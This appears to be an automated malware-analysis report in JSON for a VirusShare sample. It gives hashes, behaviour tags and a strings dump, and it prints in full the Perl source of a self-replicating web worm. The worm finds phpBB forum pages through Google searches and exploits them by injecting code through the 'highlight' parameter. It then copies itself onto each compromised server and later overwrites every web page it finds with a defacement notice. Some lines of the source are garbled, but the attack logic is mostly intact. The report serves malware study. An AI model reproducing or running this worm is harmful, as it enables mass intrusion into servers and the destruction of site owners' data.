{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "User-Agent": "May download files from the Internet",
            "Windows": "May enumerate application windows",
            "chr": "May attempt to obfuscate specific str",
            "open": "May open a file"
        },
        "macro": "#!/usr/bin/perl\nuse \nstrict;\nuse Socket;\n\n\nsub PayLoad();\nsub DoDir($);\nsub DoFile ($);\nsub GoGoogle();\n\nsub GrabURL($);\nsub str2chr($);\n\neval{ fork and exit; };\n\nmy $generation = x;\nPayLoad() if $generation > 3;\n\nopen IN, $0 or exit;\nmy $self = join '', <IN>;\nclose IN;\nunlink $0;\n\nwhile(!GrabURL('http://www.google.com/advanced_search')) {\nif($generation > 3) \n{\nPayLoad() ;\n} else {\nexit;\n}\n}\n\n$self =~ s/my \\$generation = (\\d+);/'my $generation = ' . ($1 + 1) . ';'/e;\n\nmy $selfFileName = 'm1ho2of';\nmy $markStr = 'HYv9po4z3jjHWanN';\nmy $perlOpen = 'perl -e \"open OUT,q(>' . $selfFileName . ') and print q(' . $markStr . ')\"';\nmy $tryCode = '&highlight=%2527%252Esystem(' . str2chr($perlOpen) . ')%252e%2527';\n\nwhile(1) {\nexit if -e 'stop.it';\n\nOUTER: for my $url (GoGoogle()) {\n\nexit if -e 'stop.it';\n\n$url =~ s/&highlight=.*$//;\n$url .= $tryCode;\nmy $r = GrabURL($url);\nnext unless defined $r;\nnext unless $r =~ /$markStr/;\n\nwhile($self =~ /(.{1,20})/gs) {\nmy $portion = '&highlight=%2527%252Efwrite(fopen(' . str2chr($selfFileName) . ',' . str2chr('a') . '),\n' . str2chr($1) . '),exit%252e%2527';\n\n$url =~ s/&highlight=.*$//;\n$url .= $portion;\n\nnext OUTER unless GrabURL($url);\n}\n\nmy $syst = '&highlight=%2527%252Esystem(' . str2chr('perl ' . $selfFileName) . ')%252e%2527'; \n$url =~ s/&highlight=.*$//;\n$url .= $syst;\n\nGrabURL($url);\n}\n}\n\n\n\nsub str2chr($) {\nmy $s = shift;\n\n$s =~ s/(.)/'chr(' . or d($1) . ')%252e'/seg;\n$s =~ s/%252e$//;\n\nreturn $s;\n}\n\n\nsub GoGoogle() {\nmy @urls;\nmy @ts = qw/t p topic/;\nmy $startURL = 'http://www.google.com/search?num=100&hl=en&lr=&as_qdr=all' . '&\nq=allinurl%3A+%22viewtopic.php%22+%22' . $ts[int(rand(@ts))] . '%3D' . int(rand(30000)) . \n'%22&btnG=Search';\nmy $goo1st = GrabURL($startURL)\nfined $goo1st;\nmy $allGoo = $goo1st;\nmy $r = '<td><a href=(/search\\?q=.+?)' . '><img src=/nav_page\\.gif width=16 height=26 \nalt=\"\" border=0><br>\\d+</a>';\nwhile($goo1st =~ m#$r#g) {\n$allGoo . = GrabURL('www.google.com' . $1);\n}\nwhile($allGoo =~ m#href=(http://\\S+viewtopic.php\\S+)#g) {\nmy $u = $1;\nnext if $u =~ m#http://.*http://#i; # no redirects\npush(@urls, $u);\n}\n\nreturn @urls;\n}\n\n\nsub GrabURL($) {\nmy $url = shift;\n$url =~ s#^http://##i;\n\nmy ($host, $res) = $url =~ m#^(.+?)(/.*)#;\nreturn unless defined($host) && defined($res);\n\nmy $r = \n\"GET $resHTTP/1.0\\015\\012\" . \n\"Host: $host\\015\\012\" . \n\"Accept:*/*\\015\\012\" . \n\"Accept-Language: en-us,en-gb;q=0.7,en;q=0.3\\015\\012\" .\n\"Pragma: no-cache\\015\\012\" .\n\"Cache-Control: no-cache\\015\\012\" .\n\"Referer: http://\" . $host . $res . \"\\015\\012\" .\n\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\015\\012\" .\n\"Connection: close\\015\\012\\015\\012\";\n\nmy $port = 80;\nif($host =~ /(.*):(\\d+)$/){ $host = $1; $port = $2;}\n\nmy $internet_addr = inet_aton($host) or return;\nsocket(Server, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or return;\nsetsockopt(Server, SOL_SOCKET, SO_RCVTIMEO, 10000);\n\nconnect(Server, sockaddr_in($port, $internet_addr)) or return;\nselect((select(Server), $| = 1)[0]);\nprint Server $r;\n\nmy $answer = join '', <Server>; \nclose (Server);\n\nreturn $answer;\n}\n\n\nsub DoFile($) {\nmy $s = q{\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> \n<HTML><HEAD><TITLE>This site is defaced!!!</TITLE></HEAD>\n<BODY bgcolor=\"#000000\" text=\"#FF0000\">\n<H1>This site is defaced!!!</H1>\n<HR><ADDRESS><b>NeverEverNoSanity WebWorm generation } \n. $generation .q{.</b></ADDRESS>\n</BODY></HTML>\n};\n\nunlink $_[0];\nopen OUT, \">$_[0]\" or return;\nprint OUT $s;\nclose OUT;\n}\n\n\nsub DoDir($) {\n\nmy $dir = $_[0];\n$dir .= '/' unless $dir =~ m#/$#;\n\nlocal *DIR;\nopendir DIR, $dir or return;\n\nfor my $ent (grep { $_ ne '.' and $_ ne '..' } readdir DIR) {\n\nunless(-l $dir . $ent) {\nif(-d _) {\nDoDir($dir . $ent);\nnext;\n}\n}\n\nif($ent =~ /\\.htm/i or $ent =~ /\\.php/i or $ent =~ /\\.asp/i or $ent =~ /\\.shtm/i or $ent =~ /\\.jsp/i \nor $ent =~ /\\.phtm/i) {\nDoFile($dir . $ent);\n}\n}\n\nclosedir DIR;\n}\n\n\nsub Pay Load() {\n\nmy @dirs;\n\n\neval{\nwhile(my @a = getpwent()) { push(@dirs, $a[7]);}\n};\n\npush(@dirs, '/ ');\n\nfor my $l ('A' .. 'Z') {\npush(@d \nfor my $d (@dirs) {\nDoDir($d); \n}\n}"
    },
    "filename": "VirusShare_3f8628fc07f7284353732dadb3e27703",
    "filesize": 4255,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "3f8628fc07f7284353732dadb3e27703",
        "sha1": "0e1a6aa205fa91c67d061e7c31cd1d8a165b447f",
        "sha256": "31428b691d519969d39d0f2d2b29c631aa15417fa643aaa6ac86f780006b3ea0"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "use ",
            "strict;",
            "use Socket;",
            "sub PayLoad();",
            "sub DoDir($);",
            "sub DoFile ($);",
            "sub GoGoogle();",
            "sub GrabURL($);",
            "sub str2chr($);",
            "eval{ fork and exit; };",
            "my $generation = x;",
            "PayLoad() if $generation > 3;",
            "open IN, $0 or exit;",
            "my $self = join '', <IN>;",
            "close IN;",
            "unlink $0;",
            "while(!GrabURL('http://www.google.com/advanced_search')) {",
            "if($generation > 3) ",
            "PayLoad() ;",
            "} else {",
            "exit;",
            "$self =~ s/my \\$generation = (\\d+);/'my $generation = ' . ($1 + 1) . ';'/e;",
            "my $selfFileName = 'm1ho2of';",
            "my $markStr = 'HYv9po4z3jjHWanN';",
            "my $perlOpen = 'perl -e \"open OUT,q(>' . $selfFileName . ') and print q(' . $markStr . ')\"';",
            "my $tryCode = '&highlight=%2527%252Esystem(' . str2chr($perlOpen) . ')%252e%2527';",
            "while(1) {",
            "exit if -e 'stop.it';",
            "OUTER: for my $url (GoGoogle()) {",
            "exit if -e 'stop.it';",
            "$url =~ s/&highlight=.*$//;",
            "$url .= $tryCode;",
            "my $r = GrabURL($url);",
            "next unless defined $r;",
            "next unless $r =~ /$markStr/;",
            "while($self =~ /(.{1,20})/gs) {",
            "my $portion = '&highlight=%2527%252Efwrite(fopen(' . str2chr($selfFileName) . ',' . str2chr('a') . '),",
            "' . str2chr($1) . '),exit%252e%2527';",
            "$url =~ s/&highlight=.*$//;",
            "$url .= $portion;",
            "next OUTER unless GrabURL($url);",
            "my $syst = '&highlight=%2527%252Esystem(' . str2chr('perl ' . $selfFileName) . ')%252e%2527'; ",
            "$url =~ s/&highlight=.*$//;",
            "$url .= $syst;",
            "GrabURL($url);",
            "sub str2chr($) {",
            "my $s = shift;",
            "$s =~ s/(.)/'chr(' . or d($1) . ')%252e'/seg;",
            "$s =~ s/%252e$//;",
            "return $s;",
            "sub GoGoogle() {",
            "my @urls;",
            "my @ts = qw/t p topic/;",
            "my $startURL = 'http://www.google.com/search?num=100&hl=en&lr=&as_qdr=all' . '&",
            "q=allinurl%3A+%22viewtopic.php%22+%22' . $ts[int(rand(@ts))] . '%3D' . int(rand(30000)) . ",
            "'%22&btnG=Search';",
            "my $goo1st = GrabURL($startURL)",
            "fined $goo1st;",
            "my $allGoo = $goo1st;",
            "my $r = '<td><a href=(/search\\?q=.+?)' . '><img src=/nav_page\\.gif width=16 height=26 ",
            "alt=\"\" border=0><br>\\d+</a>';",
            "while($goo1st =~ m#$r#g) {",
            "$allGoo . = GrabURL('www.google.com' . $1);",
            "while($allGoo =~ m#href=(http://\\S+viewtopic.php\\S+)#g) {",
            "my $u = $1;",
            "next if $u =~ m#http://.*http://#i; # no redirects",
            "push(@urls, $u);",
            "return @urls;",
            "sub GrabURL($) {",
            "my $url = shift;",
            "$url =~ s#^http://##i;",
            "my ($host, $res) = $url =~ m#^(.+?)(/.*)#;",
            "return unless defined($host) && defined($res);",
            "my $r = ",
            "\"GET $resHTTP/1.0\\015\\012\" . ",
            "\"Host: $host\\015\\012\" . ",
            "\"Accept:*/*\\015\\012\" . ",
            "\"Accept-Language: en-us,en-gb;q=0.7,en;q=0.3\\015\\012\" .",
            "\"Pragma: no-cache\\015\\012\" .",
            "\"Cache-Control: no-cache\\015\\012\" .",
            "\"Referer: http://\" . $host . $res . \"\\015\\012\" .",
            "\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\015\\012\" .",
            "\"Connection: close\\015\\012\\015\\012\";",
            "my $port = 80;",
            "if($host =~ /(.*):(\\d+)$/){ $host = $1; $port = $2;}",
            "my $internet_addr = inet_aton($host) or return;",
            "socket(Server, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or return;",
            "setsockopt(Server, SOL_SOCKET, SO_RCVTIMEO, 10000);",
            "connect(Server, sockaddr_in($port, $internet_addr)) or return;",
            "select((select(Server), $| = 1)[0]);",
            "print Server $r;",
            "my $answer = join '', <Server>; ",
            "close (Server);",
            "return $answer;",
            "sub DoFile($) {",
            "my $s = q{",
            "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> ",
            "<HTML><HEAD><TITLE>This site is defaced!!!</TITLE></HEAD>",
            "<BODY bgcolor=\"#000000\" text=\"#FF0000\">",
            "<H1>This site is defaced!!!</H1>",
            "<HR><ADDRESS><b>NeverEverNoSanity WebWorm generation } ",
            ". $generation .q{.</b></ADDRESS>",
            "</BODY></HTML>",
            "unlink $_[0];",
            "open OUT, \">$_[0]\" or return;",
            "print OUT $s;",
            "close OUT;",
            "sub DoDir($) {",
            "my $dir = $_[0];",
            "$dir .= '/' unless $dir =~ m#/$#;",
            "local *DIR;",
            "opendir DIR, $dir or return;",
            "for my $ent (grep { $_ ne '.' and $_ ne '..' } readdir DIR) {",
            "unless(-l $dir . $ent) {",
            "if(-d _) {",
            "DoDir($dir . $ent);",
            "next;",
            "if($ent =~ /\\.htm/i or $ent =~ /\\.php/i or $ent =~ /\\.asp/i or $ent =~ /\\.shtm/i or $ent =~ /\\.jsp/i ",
            "or $ent =~ /\\.phtm/i) {",
            "DoFile($dir . $ent);",
            "closedir DIR;",
            "sub Pay Load() {",
            "my @dirs;",
            "eval{",
            "while(my @a = getpwent()) { push(@dirs, $a[7]);}",
            "push(@dirs, '/ ');",
            "for my $l ('A' .. 'Z') {",
            "push(@d ",
            "for my $d (@dirs) {",
            "DoDir($d); "
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://.",
            "http://",
            "http://\\S+viewtopic.php\\S+#g",
            "http://www.google.com/advanced_search",
            "http://##i",
            "http://www.google.com/search?num=100&hl=en&lr=&as_qdr=all",
            "http://#i"
        ]
    },
    "time": "0:00:00.296928",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
